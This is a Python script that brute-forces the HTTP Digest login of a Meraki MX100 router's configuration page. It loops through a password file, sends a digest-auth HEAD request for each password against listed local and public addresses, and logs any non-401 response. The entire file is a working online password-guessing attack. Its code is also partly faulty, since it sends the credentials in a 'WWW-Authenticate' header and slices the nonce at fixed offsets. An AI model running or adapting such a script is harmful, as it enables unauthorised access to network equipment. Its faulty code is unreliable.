import requests
import hash
# no need for this anymore :D
# from requests.auth import HTTPDigestAuth

# different ways to get to the config page of the MX100
testurl = 'https://www.google.com'
url1 = 'http://172.16.1.1/configure'
url2 = 'http://setup.meraki.com/configure'
url3 = 'http://138.207.175.210/configure'
url4 = 'http://172.16.1.1/configure/index.cgi'

# customizable, don't know how to read headers and extract these on the fly because they're not json or dictionaries
user = 'admin'
realm = 'Meraki Manual Configuration. The login is \'admin\' and the password has been administratively configured on Meraki Dashboard.'
qop = 'auth'

nc = 1
# get a new nonce to start the chain
r = requests.head(url1)
# check if this slice is right, also idk how to get this via comprehension
nonce = r.headers['WWW-Authenticate'][180:-13]

# fresh off the stack overflow griddle
with open('pwd.txt') as file:
    # tf is list comprehension?
    passwords = [line.rstrip() for line in file]

# manual progress tracking, I know
total = 562000


# make a request with each password, starting at the last one logged
for i in range(total, len(passwords)):
    # too easy
    cnonce = hash.new_cnonce()
    h1 = hash.hash1(user, realm, passwords[i])
    h2 = hash.hash2('HEAD', '/configure')
    response = hash.response(h1, nonce, f'{nc:08d}', cnonce, qop, h2)
    headers = {
        'WWW-Authenticate' : f'Digest username="{user}", realm="{realm}", nonce="{nonce}", uri="/configure", '
                             f'algorithm=MD5, response="{response}", qop=auth, nc={nc:08d}, cnonce="{cnonce}" '
    }
    request = requests.head(url1, headers=headers)
    nc += 1
    # Reference: 401 Unauthorized & 200 Ok
    # triggers on status codes other than 200 but i'd want to know about those, too
    if request.status_code != 401:
        print(f'\n\n Status {request.status_code} detected: used \"{passwords[i]}\" and counter at {i}')
        # writes results to a file
        # NOT TESTED
        with open('results.txt', 'a') as file:
            file.write(f'Password: {passwords[i]}\nCounter: {i}\nStatus: {request.status_code}\n\n')
        # only ends on a 2xx sucessful auth
        if 200 <= request.status_code < 300:
            break
    # decreases the wall of spam, at the cost of not being able to see the status code for each request
    # print(request.request.headers)
    if i % 100 == 0:
        print(f'{i}, ', end='')
    # print(f'{i}:{request.status_code}')


# r = requests.get('https://authenticationtest.com/HTTPAuth/', auth=('user', 'pass'))
# print(r.status_code)
